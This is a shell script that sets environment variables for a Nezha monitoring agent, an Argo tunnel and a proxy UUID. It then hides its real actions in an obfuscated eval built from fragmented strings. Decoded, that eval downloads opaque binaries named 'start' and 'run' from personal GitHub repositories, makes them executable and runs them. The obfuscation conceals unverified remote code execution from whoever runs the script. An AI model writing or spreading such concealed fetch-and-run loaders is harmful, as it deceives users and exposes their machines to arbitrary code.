#!/bin/sh

export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_PORT=${NEZHA_PORT:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export TLS=${TLS:-'1'}
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
export WEB_DOMAIN=${WEB_DOMAIN:-'example.com'}
export ARGO_AUTH=${ARGO_AUTH:-''}
export WSPATH=${WSPATH:-'argo'}
export UUID=${UUID:-'de04add9-5c68-8bab-950c-08cd5320df18'}
export CFIP=${CFIP:-'icook.hk'}
export NAME=${NAME:-''}
export SERVER_PORT="${SERVER_PORT:-${PORT:-3000}}"

z="
";iz='1="h';iBz='sts,';Dz='0m"';tz='/sta';jz='ttps';dBz='art ';Ez='BOLD';RBz='ure:';CBz='4" ]';WCz='rm64';iCz='load';cCz='dy e';kCz='}Run';hBz=' exi';VBz='exit';tBz=' sta';nBz='ad."';Iz='RED=';wz=' [ "';kz='://g';NBz='port';Rz='[33m';OBz='ed a';TCz='in/r';fCz='kipp';pz='ne/t';uBz='rt f';cBz=' "st';nCz='{RES';YBz='star';mBz='wnlo';uCz=' fil';Oz='YELL';Zz='RCH"';jCz='."';Lz='GREE';Mz='N="\';Hz='m"';GCz='ted.';UCz='un"';lz='ithu';mCz='...$';QCz='e/mj';wCz='" -o';OCz='/mjj';RCz='j/ra';Az='RESE';Qz='\033';VCz='un-a';sCz='./ru';DCz='art';HBz='else';WBz=' 1';Sz='"';SBz=' $AR';qCz='d 75';ICz='SET}';FCz='mple';eBz='file';oCz='ET}"';wBz='..${';vCz='e...';PCz='onon';BBz='rch6';fBz=' alr';az=' = "';cz='64" ';Vz='name';JBz=' -e ';HCz='${RE';ECz='d co';XCz='run ';kBz='ppin';qBz='}Dow';Wz=' -m)';pBz='REEN';Fz='="\0';ZBz='t ];';lBz='g do';gz='LOAD';Bz='T="\';Tz='ARCH';aCz='le a';yBz=' -sS';bCz='lrea';yz='H" =';QBz='tect';nz='m/mj';rCz='5 ru';MCz='thub';LBz='ED}U';Kz='3[31';IBz='echo';aBz=' the';UBz='T}"';gCz='ing ';mz='b.co';rz='raw/';bz='x86_';jBz=' ski';vz='elif';xz='$ARC';EBz='en';bBz='n';ABz=' "aa';dCz='xist';tCz=' run';hCz='down';PBz='rchi';Nz='32m"';Jz='"\03';KCz='tps:';ez='hen';YCz=' "ru';TBz='CH${';Xz='if [';JCz='="ht';dz=']; t';oBz='"${G';hz='_URL';GBz='rm"';pCz='chmo';MBz='nsup';Gz='33[1';Cz='033[';Yz=' "$A';SCz='w/ma';FBz='rt-a';uz='rt"';eCz='s, s';NCz='.com';fz='DOWN';xBz='curl';CCz='o st';Uz='=$(u';ACz='L "$';XBz='fi';oz='jono';rBz='nloa';DBz='; th';BCz='1" -';sz='main';Pz='OW="';lCz='ning';qz='est/';LCz='//gi';sBz='ding';gBz='eady';KBz='"${R';vBz='ile.';ZCz='n fi';
eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Hz$z$Lz$Mz$Cz$Nz$z$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$FBz$GBz$z$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$Az$UBz$z$VBz$WBz$z$XBz$z$Xz$JBz$YBz$ZBz$aBz$bBz$z$IBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$z$HBz$z$IBz$JBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$Az$UBz$z$xBz$yBz$ACz$fz$gz$hz$BCz$CCz$DCz$z$IBz$JBz$oBz$pBz$qBz$rBz$ECz$FCz$GCz$HCz$ICz$Sz$z$XBz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$fz$gz$hz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$VCz$WCz$Sz$z$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$Az$UBz$z$VBz$WBz$z$XBz$z$Xz$JBz$XCz$dz$ez$z$IBz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$z$IBz$JBz$oBz$pBz$kCz$lCz$mCz$nCz$oCz$z$pCz$qCz$rCz$bBz$z$sCz$bBz$z$HBz$z$IBz$JBz$oBz$pBz$qBz$rBz$sBz$tCz$uCz$vCz$HCz$ICz$Sz$z$xBz$yBz$ACz$fz$gz$hz$wCz$tCz$z$IBz$JBz$oBz$pBz$qBz$rBz$ECz$FCz$GCz$HCz$ICz$Sz$z$IBz$JBz$oBz$pBz$kCz$lCz$mCz$nCz$oCz$z$pCz$qCz$rCz$bBz$z$sCz$bBz$z$XBz"